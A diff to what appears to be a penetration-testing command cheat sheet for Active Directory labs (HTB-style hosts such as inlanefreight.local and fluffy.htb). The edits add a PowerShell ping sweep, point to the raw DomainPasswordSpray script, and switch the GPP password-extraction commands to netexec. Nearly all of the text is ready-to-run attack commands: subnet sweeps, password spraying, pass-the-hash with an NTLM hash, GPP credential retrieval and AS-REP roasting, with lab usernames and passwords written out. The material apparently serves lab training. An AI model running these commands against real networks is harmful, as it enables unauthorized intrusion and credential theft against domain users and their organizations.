@@ -1218,6 +1218,8 @@ for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from" & done
 
 for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
 
+1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
+
 fping -asgq 172.16.5.0/24
 
 nmap -sT -Pn --unprivileged --send-eth 172.16.6.45
@@ -1317,7 +1319,7 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt We
 # Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
 sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
-# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.  (https://github.com/dafthack/DomainPasswordSpray)
+# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.  (https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1)
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 
@@ -3069,10 +3071,10 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M spider_plus --share Dev-share
 
 # Using  gpp_autologin Module retrieve Cleartext password in  file Registry.xml
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin 
+netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin 
 
 # Using  gpp_password Module  Retrieving GPP Passwords in file xml contain  cpassword
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
 
 # AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
 netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt
